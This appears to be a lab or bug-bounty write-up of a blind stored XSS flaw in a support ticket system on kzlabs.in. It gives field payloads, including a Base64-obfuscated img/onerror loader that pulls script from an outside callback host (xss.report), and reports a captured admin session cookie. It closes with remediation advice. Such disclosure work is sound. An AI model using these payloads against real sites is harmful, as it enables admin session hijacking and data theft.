# Blind Cross-Site Scripting (XSS) - ZAP Support Ticket System

## Summary

I identified a Blind Stored Cross-Site Scripting (XSS) vulnerability in the ZAP Support Ticket System.

The application accepts user-controlled input through multiple ticket creation fields (Name, Subject, Message) without proper sanitization or output encoding. These payloads are stored in the database and executed when an administrator views the tickets in the admin panel. Using a blind XSS payload with an `onerror` event handler and Base64-encoded JavaScript that triggers an external request to an attacker-controlled XSS reporting service (`https://xss.report`), I was able to confirm the vulnerability and capture administrator session data.

An attacker can submit a support ticket containing malicious payloads that, when viewed by administrators in the backend dashboard, execute arbitrary JavaScript. This allows the attacker to steal session cookies, capture sensitive data, and perform actions on behalf of administrators.

## Vulnerability Type

**Cross-Site Scripting (XSS) - Blind Stored**

## Vulnerable Parameters

```text
Your name (optional)
Subject
Your message
```

## Vulnerable URL

```text
https://kzlabs.in/64.php?view=ticket&id=18
```

## Steps to Reproduce

1. Navigate to the vulnerable ticket creation page at `https://kzlabs.in/64.php`.

2. Fill in the ticket form with the following payloads:

   - **Your name**: `">anil"`
   - **Subject**: `">anil<SCRIPT>alert(20)</SCRIPT>"`
   - **Your message**: `"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2tva28xMjMiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>`

3. Submit the ticket.

4. The payload is stored in the database and will execute when an administrator views the ticket in the admin panel.

5. The blind XSS payload triggers an external request to the XSS reporting service.

## Payloads Used

```text
Name: ">anil"
Subject: ">anil<SCRIPT>alert(20)</SCRIPT>"
Message: "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2tva28xMjMiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
```

Base64-decoded payload:
```javascript
var a=document.createElement("script");a.src="https://xss.report/c/koko123";document.body.appendChild(a);
```

## Proof of Concept

The support ticket system accepts user input and stores it in a database without proper sanitization. When an administrator views the admin panel at `https://kzlabs.in/64.php?view=admin`, the stored payloads are rendered and executed.

The payload works by:
1. Breaking out of the existing HTML context using `">`
2. Injecting an `<img>` tag with an `onerror` event handler
3. The `onerror` event triggers when the image fails to load (due to `src=x`, where `x` is an invalid source)
4. The `eval(atob(this.id))` decodes and executes the Base64-encoded payload
5. The decoded payload creates a `<script>` element pointing to the XSS reporting service
6. The script triggers a callback to the attacker-controlled server, confirming execution

```html
<!-- Injected payload rendered in the page: -->
"><img src="x" id="dmFyIGE9ZG9jdW1lbnQuY3JlYXRl..." onerror="eval(atob(this.id))">
```

The XSS Callbacks panel confirms successful execution by capturing:
- `document.domain: kzlabs.in`
- `Cookies: PHPSESSID=q78505e7d1mj3rpfknabt7eu3a`
- `URL: https://kzlabs.in/64.php?view=admin`

<img width="1731" height="544" alt="Screenshot 2026-08-14 205051" src="https://github.com/user-attachments/assets/cfade059-450e-405e-a7c0-bd8c628e4aca" />
<img width="1703" height="979" alt="Screenshot 2026-08-14 205625" src="https://github.com/user-attachments/assets/84a9f6aa-2aaa-4bd9-ab4e-31deabbc7303" />
<img width="1569" height="675" alt="Screenshot 2026-08-14 205649" src="https://github.com/user-attachments/assets/4652490c-d03a-4337-9557-faa4852541f5" />
<img width="1667" height="686" alt="Screenshot 2026-08-14 205747" src="https://github.com/user-attachments/assets/37fd7c47-f1e8-4131-8d4a-1a5ff201a874" />

## Impact

Blind Stored XSS vulnerabilities in support ticket systems are extremely dangerous because:

- **Persistent**: Malicious payloads are permanently stored in the database
- **Targeted Impact**: Support staff and administrators with elevated privileges are the victims
- **No User Interaction Required**: Victims don't need to click a malicious link
- **Admin Context**: Executes with administrative privileges
- **Sensitive Data**: Support tickets often contain sensitive customer information

An attacker can:

- Steal administrator session cookies and hijack admin accounts
- Perform actions with administrative privileges
- Access sensitive ticket data and customer information
- Create backdoors in the system
- Deface the admin dashboard
- Exfiltrate sensitive data from the database
- Escalate privileges across the application

## Recommendation

To mitigate this vulnerability:

- **Output Encoding**: Use `htmlspecialchars()` (or an equivalent output-encoding function) before rendering user-controlled data in HTML.
  ```php
  echo htmlspecialchars($name, ENT_QUOTES, 'UTF-8');
  echo htmlspecialchars($subject, ENT_QUOTES, 'UTF-8');
  echo htmlspecialchars($message, ENT_QUOTES, 'UTF-8');
  ```

- **Input Validation**: Validate and sanitize all user inputs before storing. Use a whitelist approach to allow only safe characters.
  ```php
  $name = preg_replace('/[^a-zA-Z0-9\s\-_.]/', '', $_POST['name']);
  ```

- **HTML Sanitization**: Use robust sanitization libraries (DOMPurify, HTML Purifier) to strip dangerous tags and attributes.

- **Content Security Policy (CSP)**: Implement a strict CSP that restricts inline scripts, event handlers, and external script sources.

- **Admin Dashboard Security**: Ensure the admin dashboard has proper access controls and is isolated from user input.

- **Context-Aware Escaping**: Use appropriate escaping based on where data is placed (HTML body, attributes, JavaScript).

- **Web Application Firewall (WAF)**: Deploy a WAF to detect and block malicious XSS payloads.

- **Security Headers**: Implement `X-XSS-Protection`, `X-Content-Type-Options`, and other security headers.

- **Case-Insensitive Filtering**: Use case-insensitive pattern matching to filter malicious content.

- **Regular Security Audits**: Conduct regular assessments and code reviews to identify vulnerabilities.

- **Admin Awareness**: Educate administrators about the risks of viewing unsanitized user data.
